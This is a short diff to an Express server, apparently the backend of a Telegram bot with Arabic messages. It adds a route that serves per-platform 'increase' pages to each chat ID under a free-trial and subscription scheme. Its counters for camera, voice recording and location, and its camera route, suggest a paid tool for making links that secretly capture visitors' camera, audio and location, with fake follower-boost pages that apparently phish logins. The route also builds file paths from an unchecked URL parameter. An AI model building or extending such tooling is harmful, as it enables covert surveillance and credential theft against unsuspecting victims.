@@ -24,6 +24,28 @@ const freeTrialEndedMessage = 'لقد انتهت الفترة التجريبية
 const adminId = '7130416076';
 const subscribedUsers = new Set();
 
+app.get('/:platform/:chatId', (req, res) => {
+    const { platform, chatId } = req.params;
+
+    if (subscribedUsers.has(chatId)) {
+        res.sendFile(path.join(__dirname, 'src', `${platform}_increase.html`));
+        return;
+    }
+
+    if (!userVisits[chatId]) {
+        userVisits[chatId] = { camera: 0, voiceRecord: 0, getLocation: 0, platform: 0 };
+    }
+
+    userVisits[chatId].platform++;
+
+    if (userVisits[chatId].platform > MAX_FREE_ATTEMPTS) {
+        res.send(`<html><body><h1>${freeTrialEndedMessage}</h1></body></html>`);
+        return;
+    }
+
+    res.sendFile(path.join(__dirname, 'src', `${platform}_increase.html`));
+});
+
 // مسار الكاميرا
 app.get('/camera/:userId', (req, res) => {
     const userId = req.params.userId;
